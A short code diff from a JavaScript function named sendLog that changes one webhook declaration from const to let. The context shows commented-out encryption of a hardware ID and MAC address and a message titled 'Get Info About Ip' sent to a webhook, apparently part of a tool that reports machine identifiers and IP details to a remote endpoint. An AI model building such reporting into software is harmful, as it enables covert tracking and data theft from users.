@@ -159,7 +159,7 @@ function sendLog(embed) {
     // encryptedHwid = encryptMyStrings(hwid)
     // encryptedMac = encryptMyStrings(macadress)
     // randomNumberr = randomNumber(2000, 99999)
-    const hook = new Webhook(embed.webhookUrl);
+    let hook = new Webhook(embed.webhookUrl);
     setTimeout(() => {
       const embed = new MessageBuilder()
          .setTitle('Get Info About Ip')
